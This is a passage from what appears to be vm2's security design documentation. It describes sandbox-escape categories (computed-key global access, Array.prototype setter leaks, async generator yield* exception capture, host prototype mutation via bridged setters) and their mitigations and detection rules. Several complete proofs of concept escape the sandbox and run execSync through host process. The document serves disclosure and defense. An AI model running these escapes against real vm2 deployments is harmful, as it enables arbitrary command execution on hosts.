new VM().run(`Reflect.get(globalThis, 'VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL')`);
new VM().run(`Object.getOwnPropertyDescriptor(globalThis, 'VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL')`);
new VM().run(`'VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL' in globalThis`);
new VM().run(`Object.getOwnPropertyNames(globalThis).find(n => n.includes('VM2_INTERNAL'))`);
```

### Why It Works

The transformer rejects any user-source `Identifier` node whose `name` matches `INTERNAL_STATE_NAME`. Property reads are not identifier nodes — the AST has `MemberExpression(globalThis, computed: 'VM2_…')` where the second argument is a `Literal` whose value is a string. The walker does not evaluate string contents, so it cannot tell whether the dynamic key happens to coincide with the protected identifier. Even tightening the walker to reject the substring would still miss `globalThis['VM2' + '_INTERNAL_…']`, `globalThis[String.fromCharCode(86,77,…)]`, base64-decoded blobs, or names obtained from `Object.getOwnPropertyNames(globalThis)` at runtime. As long as the value is reachable via `[[Get]]` on the global object, no transformer-level filter can close the class.

The previous mitigation (GHSA-wp5r-2gw5-m7q7) hardened the transformer's identifier-rejection (kept the regex bailout consistent, added the unicode-escape force-AST). It correctly closed the bare-identifier path but left the computed-key path entirely open, because the global property still existed — that fix was *specific to the identifier route*, not *structural for the binding*.

### Mitigation

Restores [Defense Invariant 10](#defense-invariants) ("Dynamic code compilation paths cannot reach an unwrapped host realm") for the implicit dependency of every transformer-instrumented `catch` / `with` / `import()` rewrite on the canonical identifier — the binding it resolves to is now a sandbox-controlled lexical record entry rather than an attacker-reflectable global property.

`lib/vm.js` (bootstrap script source for `setupSandboxScript`):

```js
const setupSandboxScript = compileScript(
  `${__dirname}/setup-sandbox.js`,
  `let ${INTERNAL_STATE_NAME};(function(global, host, bridge, data, context) { … })`,
);
```

The leading `let ${INTERNAL_STATE_NAME}` lands the binding in the context's **`[[GlobalLexicalEnvironment]]`** — a separate ECMAScript record from the global object's own-property table. Three properties of that record are what makes the fix structural:

1. **Reachable as a bare identifier from every script in the context.** Bare-identifier resolution walks the script's own lex chain, then `[[GlobalLexicalEnvironment]]`, then the global object. The transformer's emitted `${INTERNAL_STATE_NAME}.handleException(e)` therefore still resolves; this works equally for VM scripts, indirect-eval'd source (the EvalHandler's `localEval`), Function constructor bodies, and the NodeVM module wrapper, because all of them are evaluated with the same context's GlobalLexicalEnvironment as the outermost lexical outer.
2. **Not reachable from `globalThis[k]`, `Reflect.get`, descriptor APIs, or any own-property enumeration.** GlobalLexicalEnvironment entries are not properties of the global object; the global object's `[[OwnPropertyKeys]]` does not include them. `globalThis['VM2_…']`, `Reflect.has`, `'…' in globalThis`, `Object.getOwnPropertyNames`, `Reflect.ownKeys`, and prototype-chain enumeration all return `undefined` / `false` / no entry.
3. **Persistent across `runInContext` calls in the same context.** User scripts that legitimately rely on top-level `let x = …` carrying over to a later `vm.run(...)` continue to work — those declarations land in the same record, and the bootstrap's `let` is declared exactly once at VM construction.

`lib/setup-sandbox.js` then assigns `interanState` into that outer binding (`VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL = interanState`); the previous `localReflectDefineProperty(global, …)` call is removed entirely. The transformer continues to reject any user-source occurrence of the canonical identifier (including unicode-escape variants), so user code can neither shadow the binding (`let VM2_…` would collide with the bootstrap declaration) nor reference it (`VM2_…` as bare name is rejected at compile time). The only reference paths that resolve are the transformer's own injected emissions.

### Detection Rules

- **`globalThis[stringLiteral]` or `Reflect.get(globalThis, …)` in security-sensitive code review** where the literal could be the canonical name. Flag any read of a long, all-caps, underscore-separated key on `globalThis` from sandboxed code paths.
- **`Object.getOwnPropertyNames(globalThis)` filtered or pattern-matched in user code** — there is no legitimate reason for sandboxed code to enumerate the global object looking for vm2-prefixed names.
- **New properties added to the `interanState` object in `lib/setup-sandbox.js`** must continue to be covered by the GlobalLexicalEnvironment binding; do *not* re-introduce a `defineProperty` on `global` "for compatibility" — that re-opens this category.
- **Future code that needs to expose a sandbox-controlled value to transformer-emitted code** should follow the same pattern: declare an outer `let` in the bootstrap script source and assign to it from the IIFE, rather than installing a global object property. Document the design decision next to the new `let`.

### Considered Attack Surfaces

- **`let VM2_… = "evil"` in user source.** Transformer rejects the canonical identifier in any declaration form (`var`/`let`/`const`/parameter/function name/class name) so user code cannot redeclare or shadow the bootstrap binding. A redeclaration attempt would otherwise throw a `SyntaxError` because top-level `let`s share the GlobalLexicalEnvironment — but the transformer rejects earlier, with a clearer error.
- **`Function('return globalThis')()` then bracket access.** Function constructor bodies execute with the realm's GlobalEnv as outer; bare `${INTERNAL_STATE_NAME}` inside a Function body resolves through the same GlobalLexicalEnvironment, which is the *intended* path for transformer-emitted code. Bracket access via `globalThis['VM2_…']` from inside a Function body returns `undefined` for the same reason it does from any other script.
- **Indirect eval (`(0, eval)('…')`).** Indirect eval re-creates the lex env chain rooted at GlobalEnv; the GlobalLexicalEnvironment is consulted during identifier resolution exactly as for top-level script code. `eval('globalThis["VM2_…"]')` returns `undefined`; the transformer-emitted catch handlers inside eval'd source still resolve through the GlobalLexicalEnvironment.
- **`with(globalThis) { VM2_… }` after constructing a string with the canonical name dynamically.** The transformer instruments user `with()` heads with `wrapWith()`, which wraps the head expression in a Proxy whose `has` trap returns `false` for `INTERNAL_STATE_NAME` — so even a dynamically-named `with` head cannot expose the binding via the with-scope's identifier resolution path.
- **Multiple VMs sharing a process.** Each `new VM()` constructor creates its own `vm.Context`, which has its own GlobalLexicalEnvironment. The bootstrap's `let` is per-context, so VM1's binding is invisible to VM2 (and vice versa). The fix does not introduce cross-VM coupling.

---

## Attack Category 28: Bridge Internal-State Leak via Sandbox-Realm Array Setter

**Uses**: [Category 2: Prototype Chain Manipulation](#attack-category-2-prototype-chain-manipulation), [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 18: Array Species Self-Return via Constructor Manipulation](#attack-category-18-array-species-self-return-via-constructor-manipulation)

### Description

Bridge-internal containers — lists, maps, and saved-state records that exist only for the bridge's own bookkeeping — are reached from sandbox-realm closures whose intrinsics (`Array.prototype`, `Object.prototype`, `Map.prototype`) are attacker-reachable. When such a container is appended to with an ordinary index assignment `obj[obj.length] = value`, V8's `[[Set]]` walks the prototype chain whenever no own slot exists at the target index. A sandbox-installed setter on `Array.prototype[N]` therefore fires *during* the bridge's own write and observes (or mutates) the bridge's raw state.

This category covers two concrete sites that exhibit the same primitive. Both are closed by switching to identity-stable, prototype-bypassing writes (`Reflect.defineProperty` on numeric keys).

| Variant | Site | Container | Setter receives | Today's impact |
|---|---|---|---|---|
| **A** — Species saved-state (GHSA-9qj6-qjgg-37qq, CVSS 9.8) | `neutralizeArraySpeciesBatch` in `lib/bridge.js` | `saved[]` of `{ arr, originalDesc, marker }` | host-realm proxy `value.arr` of the argument array | RCE via `arr.f.constructor.constructor("return process")()` |
| **B** — Stack-trace formatter (GHSA-q3fm-4wcw-g57x, CVSS 2.1) | `defaultSandboxPrepareStackTrace` in `lib/setup-sandbox.js` | `lines[]` of formatted frame strings | primitive string `'    at CallSite {}'` | side-channel observation; no host reference reachable today because post-#563 wrapping forces every frame through sandbox `CallSite.toString()` which always returns the safe literal |

Variant B is a hardening fix rather than an exploit-today escape: the value handed to the setter is a primitive string, not a host reference. The structural concern is that the underlying *primitive* (bridge-internal container invokes sandbox code) is identical to Variant A, so any future change that enriches the appended record (e.g. an object holding a CallSite proxy or an error reference) would regress straight into the Variant A RCE shape.

### Attack Flow

**Variant A — species saved-state → RCE:**

1. **Setter on Array.prototype[0]**: sandbox code defines `Object.defineProperty(Array.prototype, 0, { set(value) { ... } })`.
2. **Plant a chain hop**: sandbox stores a useful reference on the argument array, e.g. `a.f = Buffer.prototype.inspect` — when read back via the host-realm proxy, this returns a host-realm `Function` instance whose `constructor.constructor` is host `Function`.
3. **Trigger the apply/construct trap**: `new Buffer(a)` (or any host function call with a sandbox array argument). The bridge runs `args = otherFromThisArguments(args)` and then `savedSpecies = neutralizeArraySpeciesBatch(context, args)`.
4. **Setter fires on the bridge's own state**: `saved[saved.length] = c` walks the sandbox `Array.prototype` chain, hits `Array.prototype[0]`'s setter, and hands `c` (containing the host-realm proxy `arr`) to attacker code.
5. **Pivot through the leaked proxy**: `value.arr.f.constructor.constructor("return process")()` reaches host `process`, then `mainModule.require('child_process').execSync(...)` for arbitrary command execution.

**Variant B — stack-trace formatter:**

1. **Setter on Array.prototype[N]**: sandbox installs `Object.defineProperty(Array.prototype, 1, { set(value) { ... } })`. Index 1 is the first slot the formatter writes (the array starts at `[header]`, length 1).
2. **Trigger the formatter**: any access to `error.stack` runs the wrapped `defaultSandboxPrepareStackTrace`. The wrap is installed by the `Error.prepareStackTrace` setter and routes the default through the same `CallSite` wrapping path as user-provided formatters.
3. **Bridge-internal write fires sandbox code**: the formatter executes `lines[lines.length] = '    at ' + callSites[i]`. With no own slot at index 1, V8 walks the chain and invokes the attacker-installed setter, which observes every appended frame.
4. **Read-side variant**: even with the indexed writes hardened, `lines.join('\n')` looks up `Array.prototype.join` via the prototype chain. A sandbox override receives the lines array and can rewrite the final stack string.

### Canonical Examples

**Variant A — RCE:**

```javascript
const { VM } = require('vm2');
new VM().run(`
    const a = [];
    Object.defineProperty(Array.prototype, 0, {
        set(value) {
            a.f = Buffer.prototype.inspect;
            value.arr.f.constructor.constructor('return process')()
                .mainModule.require('child_process').execSync('touch pwned');
        }
    });
    new Buffer(a);
`);
```

**Variant B — observability:**

```javascript
const { VM } = require('vm2');
const result = new VM().run(`
    const observed = { setterFired: false, capturedValue: null, indexFired: null };
    Object.defineProperty(Array.prototype, 1, {
        configurable: true,
        set(value) {
            observed.setterFired = true;
            observed.indexFired = 1;
            observed.capturedValue =
                typeof value === 'string' ? value.slice(0, 40) : typeof value;
        },
        get() { return undefined; }
    });
    const e = new Error('x');
    e.stack;
    observed;
`);
// Before fix: { setterFired: true, indexFired: 1, capturedValue: '    at CallSite {}' }
```

### Why It Works

Both `neutralizeArraySpeciesBatch` and `defaultSandboxPrepareStackTrace` execute inside sandbox-realm closures. The `apply`/`construct` trap that wraps a host function for sandbox use installs sandbox-side handlers, so the bridge code in `lib/bridge.js` runs in the sandbox-realm copy of the shared closure; the stack-trace formatter in `lib/setup-sandbox.js` runs on the sandbox global scope by construction. In both cases the `[]` array literal allocates a **sandbox-realm Array** whose prototype chain is sandbox `Array.prototype` — fully attacker-controllable.

`obj[obj.length] = value` is an ordinary `[[Set]]` with receiver `obj`. Absent an own data slot at the target index, V8 walks `[[Prototype]]` and invokes any accessor it finds, passing `value` to the setter. The same applies to `.join`: the lookup walks `[[Prototype]]` to find `Array.prototype.join`, and an override there receives the lines array as `this`.

The bridge's existing pattern in `thisFromOtherArguments` already uses `thisReflectDefineProperty` to install argument indices precisely because index assignment via `[i] =` triggers prototype-chain setters. The two sites covered here were outliers — Variant A introduced when the species defense (GHSA-grj5-jjm8-h35p) replaced its earlier no-restore variant with a `saved`-list design; Variant B introduced under the post-#563 hardening for [Category 19](#attack-category-19-host-preparestacktrace-fallback-via-arrayfromasync-promise-bypass) when `defaultSandboxPrepareStackTrace` was added to keep V8 off Node's host-side formatter.

### Mitigation

**Variant A**: `neutralizeArraySpeciesBatch` now installs every entry with `thisReflectDefineProperty(saved, savedLen, { value, writable: true, enumerable: true, configurable: true })` in `lib/bridge.js`. `Reflect.defineProperty` creates an own data property and bypasses the prototype-chain setter completely, so a sandbox-installed setter on `Array.prototype[N]` is never invoked while the bridge holds raw saved state. `restoreArraySpeciesBatch` is symmetric without code change: indexed reads on `savedList[i]` now land on own data slots installed by the neutralize pass, so a sandbox-installed **getter** on `Array.prototype[N]` cannot intercept, substitute, or mutate the saved-state record between neutralize and restore either. The defense is index-agnostic — it holds for index 0, any positive integer index, and any shape of argument list (context-only, args-only, or both).

**Variant B**: `defaultSandboxPrepareStackTrace` no longer materialises an array. The formatter folds each frame directly into a string accumulator via primitive concatenation (`result += '\n' + frame`), removing every reachable `Array.prototype` slot at once — index setters, the final `.join`, and any hypothetical future enrichment of the bridge-internal container. String concatenation routes through primitive `[[Get]]` of `callSites[i]` (a sandbox-realm `CallSite` wrapper whose `toString` returns the safe `'CallSite {}'` literal) and primitive string-plus, neither of which dispatch through `Array.prototype` or `Object.prototype`. `makeCallSiteGetters` (same file) is converted for symmetry to install each entry via `localReflectDefineProperty(callSiteGetters, idx, { value, ... })`; this loop runs at sandbox init before user code can install setters, so it is safe today, but the consistent pattern prevents future regressions and keeps the indexed reads at `applyCallSiteGetters` immune to later sandbox-installed getters on `Array.prototype[N]`.

Together these fixes restore [Defense Invariant #11: Bridge-Internal Containers Must Not Invoke Sandbox Code](#defense-invariants): any list, set, or map allocated for the bridge's exclusive use must read and write through identity-stable, prototype-bypassing primitives — never operators that fall through to `Array.prototype` / `Object.prototype` / `Map.prototype.{get,set}`. The same invariant explains why the bridge already uses `thisReflectApply(thisWeakMapSet, mapping, [k, v])` rather than `mapping.set(k, v)` everywhere. The chokepoint is now uniform across `lib/bridge.js` and `lib/setup-sandbox.js`.

**Supersedes**: this category retroactively hardens the [Category 18](#attack-category-18-array-species-self-return-via-constructor-manipulation) species defense by closing the saved-list write path the attacker would otherwise use to extract the very state the species fix produces. Variant B closes the audit gap from Variant A's original mitigation, which was scoped to `lib/bridge.js`.

### Detection Rules

- **`Object.defineProperty(Array.prototype, <int>, { set: ... })` immediately preceding a host-function call or `error.stack` read** — classic shape of either variant; near-zero legitimate use case.
- **`Array.prototype.join` override followed by Error access** — read-side variant of the stack-trace primitive.
- **Setter or getter on `Array.prototype` numeric indices in untrusted code** — should be treated as suspicious in any sandboxed context, regardless of which bridge container is the target.
- **Reads of `value.arr` / `value.constructor` / `value.<bridge-internal-key>` inside an `Array.prototype` setter** — capture-and-extract pattern aimed at bridge state.

### Considered Attack Surfaces

- **`saved.length` write via sandbox `Array.prototype.length` getter**: writing to `saved[savedLen]` reads `saved.length` only via the local counter; even if reading were used, V8 services array `length` from the magic own slot and never consults `Array.prototype.length` for instances.
- **`Object.prototype` setter on numeric keys**: in Variant A, `c` is a `{ __proto__: null, ... }` literal, so reads on `value.arr` inside the captured record do not walk `Object.prototype` either; even if they did, the leak channel is the `Array.prototype[N]` setter, not the record's own access path.
- **`callSites[i]` invoking sandbox `toString`** (Variant B): `callSites[i]` is a sandbox-realm `CallSite` wrapper instance whose `toString` is defined as a fixed `'CallSite {}'` literal. The string concatenation invokes that wrapper, which is deliberate sandbox-facing API — Invariant #11 forbids the *bridge container* from invoking sandbox code, not the bridge from invoking documented sandbox-realm safe accessors on individual values.
- **`'    at ' + callSites[i]` triggering `Symbol.toPrimitive`** (Variant B): the `CallSite` wrapper does not define `Symbol.toPrimitive`, so V8 invokes the standard `toString`/`valueOf` path. The wrapper's `toString` returns a string, so the conversion never reaches `Symbol.toPrimitive` even if it were defined on `Object.prototype` (which the existing symbol-filter defenses would catch separately).
- **`result += '\n' + frame` and host-realm primitives** (Variant B): string `+` is a pure primitive operation on the V8 string type and does not dispatch through `Object.prototype` or `String.prototype` accessors.
- **Equivalent pattern elsewhere in the bridge**: audited end-to-end. `thisFromOtherArguments`, `otherFromThisArguments`, and every other index-write site in `lib/bridge.js` use `thisReflectDefineProperty` or `otherReflectDefineProperty`. `neutralizeArraySpeciesBatch` (Variant A) and `defaultSandboxPrepareStackTrace` / `makeCallSiteGetters` (Variant B) were the remaining outliers; both are now fixed. The invariant is uniform across `lib/bridge.js` and `lib/setup-sandbox.js`.

---
## Attack Category 29: Async Generator yield*-Return Thenable Exception Capture

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation).

### Description

When an async generator delegates with `yield*` to an inner async iterator that lacks a `return` method, the spec specifies that calling `.return(value)` on the outer generator must `Await(value)` and then propagate the abrupt return up. V8 implements this via the standard `PromiseResolveThenableJob`: if `value` is a thenable, V8 calls `value.then(resolve, reject)` and any synchronous throw from that call is caught by the engine. The captured throw is then surfaced to the outer async generator through the yield*'s continuation as a yielded result of shape `{ value: thrownError, done: false }`.

This produces a path along which a thrown value flows from a sandbox closure into another sandbox `await` **without ever entering a JavaScript `try/catch`**. Both vm2 defenses against host-realm error smuggling assume an explicit catch:

1. The transformer-instrumented `catch` block (every user `catch` calls `handleException`) is bypassed because the catch is implicit in V8 internals.
2. The `globalPromise.prototype.then` rejection sanitiser is bypassed because internal `Await` uses `PerformPromiseThen` directly and never invokes the user-visible `.then` override.

The reporter's PoC chains this with deep recursion: at the precise depth where V8 detects stack overflow inside the host C++ `PromiseResolveThenableJob` glue, the `RangeError` is created in the **host** realm. With both sanitisers bypassed, the host `RangeError` is supposed to reach sandbox code unwrapped, after which `e.constructor.constructor("return process")()` yields RCE.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Define an async generator that delegates via `yield* { [Symbol.asyncIterator]: () => ({ next: v => ({ value: v, done: false }) }) }` (no `return` method on the inner iterator).
2. Advance the outer generator one step with `await i.next()` so the suspension is inside `yield*`.
3. Call `await i.return(thenable)` where `thenable = { then(r) { f(); r(); } }`. V8's algorithm awaits the thenable; `PromiseResolveThenableJob` invokes `thenable.then`. `f()` throws.
4. V8 catches the throw inside the C++ resolver job. The yield* continuation surfaces the captured value to the outer async generator as `{ value: thrown, done: false }`.
5. Sandbox `await i.return(...)` resolves with that fulfillment shape — no rejection path was taken, so `globalPromise.prototype.then` is never invoked. No user `catch` clause was entered, so the transformer's instrumentation is never invoked.
6. With binary search, the attacker hunts for the recursion depth where the throw originates inside V8's host code, producing a host-realm `RangeError`. `e.constructor.constructor` is then the host `Function` constructor and `("return process")()` returns `process` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-248r-7h7q-cr24)
class E extends Error {}
function so(d) {
  if (d > 0) so(d - 1);
  const e = new E();
  e.stack;
  throw e;
}
async function* helper() {
  yield* {
    [Symbol.asyncIterator]: () => ({
      next: v => ({ value: v, done: false }),
    }),
  };
}
async function doCatch(f) {
  const i = helper();
  await i.next();
  const v = await i.return({ then(r) { f(); r(); } });
  return v.value;
}
(async () => {
  let min = 0, max = 10000000;
  while (min < max) {
    const mid = (min + max) >> 1;
    const e = await doCatch(() => so(mid));
    if (e.name === 'RangeError' && !(e instanceof RangeError)) {
      e.constructor.constructor('return process')()
        .mainModule.require('child_process').execSync('touch pwned');
      return;
    }
    if (e instanceof E) min = mid + 1; else max = mid;
  }
})();
```

### Why It Works

The yield* abrupt-return path is one of the rare specification-mandated places where a value flows back into sandbox code through V8's internal Promise machinery without traversing a JavaScript `try/catch` and without invoking `Promise.prototype.then`. Both of vm2's existing chokepoints for host-realm value sanitisation are tied to those two surfaces:

- **Transformer instrumentation** rewrites every `catch (e) {` into `catch (e) { e = handleException(e); ...`. There is no source-level `catch` here — V8 catches the throw in C++ during PromiseResolveThenableJob.
- **`globalPromise.prototype.then` override** wraps `onFulfilled` with `from()` and `onRejected` with `handleException()`. V8's `Await` operation (used by `await` inside async functions) is specified in terms of `PerformPromiseThen`, an internal abstract operation that builds builtin reactions without going through the user-visible `.then` getter, so neither wrapper fires for internal awaits.

### Mitigation

The defense has two layers, both in `lib/setup-sandbox.js` (after `handleException` is defined and the bridge sanitisers are wired):

**Layer 1 — iterator-result sanitisation.** Wrap `%AsyncGeneratorPrototype%.next` / `.return` / `.throw` so every iterator-result promise returned by an async generator chains through a sanitisation step that:

- Routes the resolved `result.value` through `handleException` (no-op for sandbox-realm or primitive values; bridge-wraps host-realm values; recursively sanitises `SuppressedError.error/.suppressed` and `AggregateError.errors[]`).
- Routes any rejection through `handleException` before re-throwing.

The chain uses the cached native `globalPromisePrototypeThen` (not the overridden user-visible `.then`) so the sanitiser does not double-handle and cannot be observed via species manipulation on intermediate promises. New iterator-result objects are constructed when the value changes — never mutate an attacker-controlled result shape.

**Layer 2 — thenable-arg sanitisation (closure-transport bypass).** Layer 1 alone is bypassable: an inner iterator can return `{ value: () => v, done: false }` where the closure traps the value V8 forwards as the parameter to `inner.next(captured)` on the abrupt-return loop turn. The wrapper sees only the closure, `handleException` returns it unchanged, and sandbox extracts the raw value via `wrap.value()`. To close this, the wrapper also intercepts the first argument to `.next` / `.return` / `.throw`: it is **always** replaced with a sandbox-realm wrapper whose `.then` is a fixed `safeThen` function. `safeThen` reads `value.then` exactly once internally; if it is a function, it is invoked with sanitising callbacks, and any synchronous throw is converted to `reject(handleException(e))`. V8's `PromiseResolveThenableJob` then captures a sandbox-realm rejection value, so by the time V8 forwards the value into `inner.next`, the realm has been normalized.

The wrapper closes three sub-attacks against this transport:

1. **Direct sync throw.** `safeThen` wraps the user `.then` call in `try/catch` and converts throws to `reject(handleException(e))`.
2. **Nested-thenable resolve** — `{ then(r){ r({ then(r){ f(); r(); }}) }}`. The outer `.then` resolves with another thenable; V8 recursively unwraps via another `PromiseResolveThenableJob`, and the inner `.then` would otherwise run unwrapped. Fix: `safeThen` wraps the `resolve` callback so any thenable handed to it is recursively re-sanitised before V8 sees it (`safeResolve(v) → resolve(sanitizeThenableArg(v))`). V8 only ever invokes our `safeThen`, never a user `.then` directly.
3. **Getter TOCTOU on `.then`** — a getter returns `undefined` on a pre-read and a real function on V8's read. Fix: never pre-read; always substitute the wrapper. For the non-thenable branch (`value.then` not callable when `safeThen` reads it), `safeThen` **always** resolves with a fresh `{ __proto__: null }` shadow that copies all of `value`'s own descriptors *except* `.then`. V8's subsequent `PromiseResolve` cannot re-detect a thenable on the shadow because it has no `.then` own or inherited property.

   **History — why "always shadow":** v5/v6 of this fix tried to preserve identity for benign non-thenable inputs (`i.return(myMap)` returning the same Map back) by gating the shadow on a descriptor walk that detected accessors anywhere in the chain. The reviewer demonstrated two structural bypasses:
   - **Self-replacing getter** (v6 bypass, GHSA-248r-7h7q-cr24, follow-up): the getter counts to N, returns non-function on each pre-read, then on the Nth call self-replaces with a `defineProperty` call installing a data property holding a malicious function. By the time the descriptor walk runs, the slot is already a data property; the walk concludes "no accessor present" and the code passes `value` to `resolve()`. V8's `[[Get]](value, 'then')` then reads the malicious function from the data property and schedules a fresh `PromiseResolveThenableJob` that calls it with V8's internal capability resolvers — **outside** any `safeThen` wrapper. Provable empirically: the resolver argument's `.name` is `''` (V8 internal) instead of `'safeResolveCallback'` (our wrapper).
   - **Proxy with lying descriptors** (theoretical for vm2 since Proxy is removed from the sandbox global, but structurally identical): a Proxy can return arbitrary values from the `get` trap across reads while `getOwnPropertyDescriptor` lies about what is "really" there. Detection-based heuristics on attacker-controlled `.then` slots are fundamentally bypassable; doubling, tripling, or N-reading the slot does not help because attackers control the read-count state machine.

   The v7 structural answer is: **never** trust a `.then` slot we did not place ourselves. When `userThen` reads non-function once, replace `value` with a sandbox-realm shadow that V8 reads instead. Identity preservation in this codepath is incompatible with safety against TOCTOU on `.then`.

Implementation note: the wrap targets `%AsyncGeneratorPrototype%` (the shared intrinsic that owns `next/return/throw`), reached via `getPrototypeOf(getPrototypeOf(asyncGenInstance))`. A single `getPrototypeOf` walk reaches only the per-function prototype, which is unique to each async generator function and ineffective for any other generator — a subtle but critical point for prototype-level wraps of generator protocols.

The wrapper builds its `argsList` as `{ __proto__: null, length, ... }` rather than a `[]` literal: an empty array literal inherits `Array.prototype`, and a sandbox-installed setter on `Array.prototype['0']` (or `Object.prototype['0']`) would walk the chain when `args[0] = arguments[0]` runs and intercept the user value before `sanitizeThenableArg` ever ran. With `__proto__: null`, integer-key writes never walk a user-controlled prototype.

The three wrapped methods are installed with `writable: false, configurable: false` so sandbox code cannot delete or redefine them — even without a reference to the original native, replacing the wrapper would let sandbox interpose its own logic on V8's yield* protocol invocations.

Every previous direct call to `handleException(e)` from the wrapper code is now routed through `safeSanitize(e)`, which catches throws from `handleException` itself (e.g., `bridge.from` failing on a hostile prototype) and falls back to a sandbox-realm `VMError`. Without this, an uncaught throw from `handleException` would propagate out of `safeThen` (or out of `sanitizeRejectedIterResult`) and become the resolver-job's captured value — sandbox would observe a host-realm rejection that defeated the whole sanitisation chain.

Together the two layers restore **[Defense Invariant #2](#defense-invariants)** (every value entering a `catch` clause passes through `handleException`) for the implicit-catch case in V8's async generator state machine, and **Invariant #1** (no host-realm object reaches sandbox code unwrapped) for both the iterator-result `value` slot and the closure-transport variant.

### Detection Rules

- **`yield*` inside an async generator** delegating to an attacker-controlled async iterator (`{ [Symbol.asyncIterator]: () => ({...}) }`) — particularly when the inner object lacks a `return` method.
- **`.return(value)` on an async generator where `value` is a thenable** — the attacker-controlled `.then` is the implicit-catch primitive. The thenable-arg sanitisation in Layer 2 wraps every such argument before it reaches V8's resolver job.
- **Inner iterators returning `{ value: closure, done: ... }` shapes** — closures hide the captured value from prototype-level wrappers. Layer 2 closes this by sanitising at the source (the thenable input) rather than the closure output.
- **Nested thenables in `resolve(...)` calls** — `safeResolve` recursively re-sanitises any thenable handed to it, so `{ then(r){ r(innerThenable) }}` chains stay inside the wrap.
- **Getter-driven TOCTOU on `.then`** — `safeThen` reads `value.then` exactly once for the initial type check. If non-function, the wrapper unconditionally resolves with a fresh `{ __proto__: null }` shadow that copies all of `value`'s own descriptors **except** `.then`. V8's subsequent `[[Get]]` reads the shadow (which we control), not the user's `value`, so the entire family of `.then`-slot TOCTOU primitives — counting getters, self-replacing getters, Proxy `get` traps that switch values across reads — is closed by construction.

  Trade-off: identity is **not** preserved for non-thenable values passed to `i.return(x)`. `wrap.value` is a stripped `{ __proto__: null }` copy of `x`'s own data, not `x` itself. The v5/v6 attempts to preserve identity (descriptor walk, double-read) were structurally unsound — every detection-based heuristic on an attacker-controlled `.then` slot can be bypassed by counting reads. If sandbox code needs the original reference, it should keep its own copy outside the `i.return()` call.
- **Array.prototype / Object.prototype setter pollution on the args build** — covered by the `{ __proto__: null }` argsList described above; integer-key writes on the wrapper's args object never walk a sandbox-controlled prototype.
- **Sandbox redefining the wrapper itself** — covered by the `writable: false, configurable: false` install, blocking `delete agProto.next`, `agProto.next = malicious`, and `defineProperty(agProto, 'next', ...)`.
- **Awaiting iterator results inside async generators** without going through a user `catch` clause — every such path must be sanitised at the prototype level.
- **Any new V8 specification path that uses `PerformPromiseThen` directly on a sandbox Promise** without invoking user-visible `.then` — review whether values flowing through it still pass `handleException`.

### Considered Attack Surfaces

- **Sync `Generator.prototype.next/.return/.throw`** — sync generators do not `Await` values, so the thenable→throw→yielded-value primitive does not apply. Sync iter results are delivered synchronously and any thrown value enters a sandbox `catch` (transformer-instrumented) or escapes as an exception that the existing rejection sanitiser handles. Not wrapped.
- **`for await (...)` over an async iterator** — every iteration calls `iter.next()` and awaits the result. `next()` is now wrapped, so any value flowing through the loop is sanitised.
- **Direct `await asyncIter.next()` outside a generator context** — same chokepoint; covered by the prototype wrap.
- **Host-realm async iterators returned to sandbox** — bridge proxies route property access (`.next`, `.return`, `.throw`) through the apply trap, which already wraps host throws via `thisFromOtherForThrow`. The async generator prototype wrap is independent and does not change this path.
- **Attacker-supplied inner iterator with a `return` method that throws** — when `iter.return` exists and throws, the spec routes through the rejection path (no implicit fulfillment). The wrapped `.return` on the outer generator sanitises the rejection regardless.

---

## Attack Category 30: Host Prototype Mutation via Bridged Setter Primitives

**Uses**: [Category 2: Prototype Chain Manipulation](#attack-category-2-prototype-chain-manipulation), [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation).

### Description

The bridge's `set` / `defineProperty` / `setPrototypeOf` proxy traps block direct mutation of host-realm objects from the sandbox (`isProtectedHostObject`). But the **apply trap** lets sandbox code invoke host functions with a host object as `this`. When the function being applied is host's `Object.prototype.__proto__` setter (or any prototype-mutating intrinsic — `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.prototype.__defineSetter__`, etc.), the actual mutation happens inside the host intrinsic with `this` = the raw host object, **bypassing every write trap** because no proxy is involved in the assignment.

Severing even a non-protected host prototype (Node-internal `NodeError.prototype`, a per-error `[[Prototype]]`, etc.) is enough to break downstream bridge invariants: once a host-realm chain is truncated, the bridge's proto-walking helpers (`thisFromOtherWithFactory`, `thisFromOtherForThrow`, `thisEnsureThis`) can no longer find a registered mapping at the right level, and the value can fall through unwrapped. From there `e.constructor.constructor` resolves to host `Function`, and `new HostFunction("return process")()` yields RCE.

The PoC reaches host's `__proto__` setter via:

```javascript
const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__");
```

`{}.__lookupSetter__` is sandbox-side but `connect()`'ed to host's, so when applied through `Buffer.call.call(...)` it returns host's `Object.prototype.__proto__` setter (wrapped as a bridge proxy). Calling `setProto.call(<wrapped host object>, null)` invokes the wrapped host setter via the apply trap. Before this fix the trap simply unwrapped `context` and forwarded the call to `otherReflectApply(hostSetter, rawHostObject, [null])`, mutating the host object's prototype.

The canonical PoC pairs the setter primitive with `WebAssembly.compileStreaming()` to surface a host-realm `TypeError`:

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Resolve `getProto` / `setProto` to host's `Object.prototype.__proto__` accessor via `Buffer.call.call({}.__lookup{Getter,Setter}__, Buffer, "__proto__")`.
2. Trigger a host-realm rejection — `await WebAssembly.compileStreaming()` throws a host `TypeError`.
3. In `catch (e)`, the host `TypeError` arrives wrapped (the first time the bridge has seen it). Call `setProto.call(getProto.call(e), null)`. The apply trap unwraps `context` to the raw host `TypeError.prototype` and forwards to the host setter, severing the host `TypeError.prototype.[[Prototype]]` from host `Error.prototype`.
